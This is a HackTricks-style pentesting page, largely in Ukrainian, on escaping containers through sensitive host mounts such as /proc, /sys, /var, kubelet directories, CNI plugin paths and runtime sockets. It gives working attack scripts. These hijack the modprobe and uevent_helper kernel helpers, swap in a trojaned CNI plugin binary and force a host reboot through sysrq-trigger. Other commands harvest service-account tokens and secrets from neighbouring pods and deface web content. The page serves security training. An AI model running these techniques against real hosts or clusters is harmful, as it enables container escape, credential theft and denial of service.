# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts — це один із найважливіших практичних шляхів container-escape, тому що вони часто зводять ретельно ізольоване process view назад до прямої видимості host resources. Небезпечні випадки не обмежуються `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, або device-related paths можуть expose kernel controls, credentials, neighboring container filesystems, and runtime management interfaces.

This page exists separately from the individual protection pages because the abuse model is cross-cutting. A writable host mount is dangerous partly because of mount namespaces, partly because of user namespaces, partly because of AppArmor or SELinux coverage, and partly because of what exact host path was exposed. Treating it as its own topic makes the attack surface much easier to reason about.

## `/proc` Exposure

procfs містить і звичайну information про processes, і high-impact kernel control interfaces. Bind mount на кшталт `-v /proc:/host/proc` або container view, що expose unexpected writable proc entries, може therefore lead to information disclosure, denial of service, or direct host code execution.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Start by checking which high-value procfs entries are visible or writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ці paths цікаві з різних причин. `core_pattern`, `modprobe`, і `binfmt_misc` можуть стати host code-execution paths, якщо їх можна записувати. `kallsyms`, `kmsg`, `kcore`, і `config.gz` — потужні джерела reconnaissance для kernel exploitation. `sched_debug` і `mountinfo` розкривають context процесів, cgroup і filesystem, що може допомогти відновити layout host зсередини container.

Практична цінність кожного path різна, і якщо поводитися з ними так, ніби вони мають однаковий impact, triage ускладнюється:

- `/proc/sys/kernel/core_pattern`
Якщо writable, це один із найвпливовіших procfs paths, тому що kernel виконає pipe handler після crash. Container, який може вказати `core_pattern` на payload, збережений у його overlay або в mounted host path, часто може отримати host code execution. Див. також [read-only-paths.md](protections/read-only-paths.md) для окремого прикладу.
- `/proc/sys/kernel/modprobe`
Цей path керує userspace helper, який використовує kernel, коли йому потрібно викликати logic завантаження module. Якщо його можна записувати з container і він інтерпретується в host context, це може стати ще однією host code-execution primitive. Особливо цікаво у поєднанні зі способом викликати helper path.
- `/proc/sys/vm/panic_on_oom`
Зазвичай це не чиста primitive для escape, але може перетворити memory pressure на denial of service для всього host, переводячи OOM conditions у behavior kernel panic.
- `/proc/sys/fs/binfmt_misc`
Якщо interface реєстрації writable, attacker може зареєструвати handler для вибраного magic value і отримати execution у host-context, коли буде виконано файл, що збігається.
- `/proc/config.gz`
Корисно для kernel exploit triage. Допомагає визначити, які subsystems, mitigations і optional kernel features увімкнені, без потреби в host package metadata.
- `/proc/sysrq-trigger`
Переважно path для denial-of-service, але дуже серйозний. Може негайно reboot, panic або іншим чином порушити роботу host.
- `/proc/kmsg`
Розкриває kernel ring buffer messages. Корисно для host fingerprinting, crash analysis і в деяких environments для leak інформації, корисної для kernel exploitation.
- `/proc/kallsyms`
Цінний, якщо readable, бо розкриває exported kernel symbol information і може допомогти зламати припущення про address randomization під час розробки kernel exploit.
- `/proc/[pid]/mem`
Це прямий interface до memory процесу. Якщо цільовий process досяжний із необхідними ptrace-style conditions, це може дозволити читати або змінювати memory іншого process. Реальний impact сильно залежить від credentials, `hidepid`, Yama і ptrace restrictions, тож це потужний, але умовний path.
- `/proc/kcore`
Розкриває core-image-style view memory системи. Файл дуже великий і незручний у використанні, але якщо його можна meaningful read, це означає погано захищену host memory surface.
- `/proc/kmem` and `/proc/mem`
Історично high-impact raw memory interfaces. На багатьох modern systems вони вимкнені або сильно обмежені, але якщо вони присутні й usable, їх слід вважати critical findings.
- `/proc/sched_debug`
Leak scheduling і task information, що може розкрити host process identities навіть тоді, коли інші process views виглядають cleaner, ніж очікувалося.
- `/proc/[pid]/mountinfo`
Надзвичайно корисно для відновлення того, де container насправді живе на host, які paths мають overlay-backed, і чи відповідає writable mount host content, чи лише container layer.

Якщо `/proc/[pid]/mountinfo` або overlay details readable, використовуйте їх, щоб відновити host path filesystem container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, тому що для низки host-execution трюків потрібно перетворити шлях усередині контейнера на відповідний шлях з точки зору хоста.

### Повний приклад: `modprobe` Helper Path Abuse

Якщо `/proc/sys/kernel/modprobe` можна записувати з контейнера, і helper path інтерпретується в контексті хоста, його можна перенаправити на payload, контрольований атакувальником:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки kernel, але важливий момент у тому, що writable helper path може перенаправити майбутній виклик kernel helper до контрольованого attacker content у host-path.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Якщо мета — оцінка exploitability, а не негайний escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають відповісти, чи видно корисну symbol information, чи recent kernel messages розкривають цікаві state, і які kernel features або mitigations скомпільовані. Вплив зазвичай не є direct escape, але це може різко скоротити kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
Ефект — негайне перезавантаження host. Це не тонкий приклад, але він чітко демонструє, що exposure `procfs` може бути набагато серйознішим, ніж information disclosure.

## `/sys` Exposure

`sysfs` exposes великі обсяги kernel і device state. Деякі шляхи `sysfs` переважно корисні для fingerprinting, тоді як інші можуть впливати на helper execution, поведінку device, конфігурацію security-module або стан firmware.

High-value шляхи `sysfs` include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку thermal-management і, відповідно, на stability host у погано захищених середовищах. `/sys/kernel/vmcoreinfo` може leak-нути crash-dump і kernel-layout information, що допомагає з low-level fingerprinting host. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовують Linux Security Modules, тож неочікуваний access там може exposed або змінити MAC-related state. Шляхи EFI variables можуть впливати на firmware-backed boot settings, роблячи їх набагато серйознішими за звичайні configuration files. `debugfs` у `/sys/kernel/debug` особливо небезпечний, бо це навмисно інтерфейс для developers із набагато меншими очікуваннями щодо safety, ніж у hardened production-facing kernel APIs.

Корисні review commands для цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи AppArmor, SELinux або інший LSM surface видно так, як це мало б залишатися лише на host.
- `/sys/kernel/debug` часто є найтривожнішою знахідкою в цій групі. Якщо `debugfs` змонтовано і доступне для читання або запису, очікуйте широкий kernel-facing surface, чий точний ризик залежить від увімкнених debug nodes.
- EFI variable exposure трапляється рідше, але якщо присутня, то має високий impact, бо стосується firmware-backed налаштувань, а не звичайних runtime файлів.
- `/sys/class/thermal` головно важливий для host stability та взаємодії з hardware, а не для акуратного shell-style escape.
- `/sys/kernel/vmcoreinfo` головно є джерелом host-fingerprinting і crash-analysis, корисним для розуміння low-level kernel state.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Причина, чому це працює, полягає в тому, що шлях helper інтерпретується з точки зору host. Після запуску helper виконується в host context, а не всередині поточного container.

## `/var` Exposure

Монтування host `/var` у container часто недооцінюють, бо це не виглядає так драматично, як монтування `/`. На практиці цього може бути достатньо, щоб дістатися до runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens і сусідніх application filesystems. На сучасних nodes `/var` часто є місцем, де насправді живе найцікавіший з operational точки зору container state.

### Kubernetes Example

pod із `hostPath: /var` часто може читати projected tokens інших pod і overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, тому що вони відповідають, чи exposes mount лише нудні дані застосунку, чи високоризикові cluster credentials. Читабельний service-account token може негайно перетворити local code execution на доступ до Kubernetes API.

Якщо token присутній, перевірте, до чого він може дістатися, замість того щоб зупинятися на виявленні token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Вплив тут може бути значно більшим, ніж локальний node access. token із широким RBAC може перетворити змонтований `/var` на compromise всього cluster.

### Docker And containerd Example

На Docker host'ах relevant data часто знаходиться під `/var/lib/docker`, тоді як на Kubernetes nodes на основі containerd воно може бути під `/var/lib/containerd` або шляхами, специфічними для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває доступ до writable snapshot contents іншого workload, attacker може змінювати application files, розміщувати web content або змінювати startup scripts без втручання в поточну container configuration.

Concrete abuse ideas once writable snapshot content is found:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, оскільки вони показують три основні сімейства впливу змонтованого `/var`: application tampering, recover secretів і lateral movement у сусідні workloads.

## Kubelet State, Plugins, And CNI Paths

Mount of `/var/lib/kubelet`, `/opt/cni/bin`, or `/etc/cni/net.d` often exposed through privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, and storage helpers. These mounts are easy to dismiss as "node plumbing", but they sit directly in the execution path for new pods and often contain kubelet credentials, projected secrets, registration sockets, and executable host-side plugin binaries.

High-value targets include:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Чому ці paths мають значення:

- `/var/lib/kubelet/pki` може розкривати kubelet client certificates та інші node-local credentials, які іноді можна повторно використати проти API server або kubelet-facing TLS endpoints, залежно від design кластера.
- `/var/lib/kubelet/pods` часто містить projected service-account tokens і mounted Secrets для сусідніх pods на тому самому node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` — це переважно reconnaissance surface, але дуже корисна: вона показує, які pods і containers зараз використовують GPUs, hugepages, SR-IOV devices та інші дефіцитні node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` і `/var/lib/kubelet/plugins_registry` показують, які CSI, DRA та device plugins встановлені і з якими sockets kubelet очікує взаємодіяти. Якщо ці directories writable, а не лише readable, finding стає значно серйознішим.
- `/opt/cni/bin` і `/etc/cni/net.d` знаходяться безпосередньо на шляху pod-network setup. Writable access там часто є delayed host-execution primitive, а не просто exposure конфігурації.

### Full Example: Writable `/opt/cni/bin`

Якщо host CNI binary directory змонтовано read-write, заміна plugin може бути достатньою, щоб отримати host execution наступного разу, коли kubelet створює pod sandbox на цьому node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Це не настільки негайно, як змонтований `docker.sock`, але це часто більш реалістично в скомпрометованих Kubernetes infrastructure pods. Важливий момент у тому, що змінений binary пізніше виконується flow налаштування host network, а не поточним container.


## Runtime Sockets

Sensitive host mounts часто включають runtime sockets, а не повні directories. Вони настільки важливі, що заслуговують на явне повторення тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
See [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) for full exploitation flows once one of these sockets is mounted.

Як швидкий початковий шаблон взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із цих способів спрацьовує, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай значно коротший, ніж будь-який kernel breakout шлях.

## Mount-Related CVEs

Host mounts також перетинаються з runtime вразливостями. Важливі нещодавні приклади включають:

- `CVE-2024-21626` у `runc`, де leaked directory file descriptor міг помістити working directory на host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де malicious Dockerfiles, frontends і `RUN --mount` flows могли знову відкрити host file access, deletion або elevated privileges під час builds.
- `CVE-2024-1753` у Buildah і Podman build flows, де crafted bind mounts під час build могли expose `/` read-write.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час image unpack міг дозволити specially crafted image змінювати host filesystem під час pull.

Ці CVEs важливі тут, тому що вони показують: handling mounts — це не лише питання operator configuration. Сам runtime також може створювати mount-driven escape conditions.

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Що тут цікаво:

- Host root, `/proc`, `/sys`, `/var` і runtime sockets — усе це знахідки високого пріоритету.
- Записувані `proc/sys`-записи часто означають, що mount відкриває host-global kernel controls, а не безпечний container view.
- Змонтовані шляхи `/var` заслуговують на перевірку credentials і сусідніх workloads, а не лише filesystem review.
- Каталоги стану kubelet і шляхи CNI/plugin заслуговують на такий самий пріоритет, як і runtime sockets, бо вони часто лежать прямо на шляху створення pod і розподілу credentials на node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
